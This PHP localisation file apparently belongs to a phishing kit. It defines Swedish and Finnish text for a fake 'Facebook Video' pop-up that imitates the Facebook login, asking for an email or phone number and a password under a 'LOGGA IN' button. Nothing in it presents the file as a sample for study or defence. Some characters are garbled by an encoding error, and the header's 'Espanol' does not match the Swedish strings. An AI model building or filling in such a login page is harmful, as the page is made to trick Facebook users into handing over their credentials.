<?php
/*
-----------------
Idioma: Espanol
-----------------
*/
 
$lang = array();
 
// General

$lang['LANG'] = 'sv';
 
// Fondo

$lang['TITULO_PAGINA'] = 'Facebook application';
 
// Pop-UP
 
$lang['POPUP_TITULO'] = 'Facebook Video Ans�kan (free)';
$lang['POPUP_DESCRIPCION'] = '�VASTAA SALASANA?';
$lang['POPUP_CORREO'] = 'E-post eller telefon';
$lang['POPUP_CONTRASENA'] = 'L�senord';
$lang['POPUP_SUBMIT'] = 'LOGGA IN';
$lang['POPUP_CANDADO'] = 'Denna ans�kan �r inte till�tet att publicera p� Facebook.';

/*
$langSv = array("Sweden", "Finland")
*/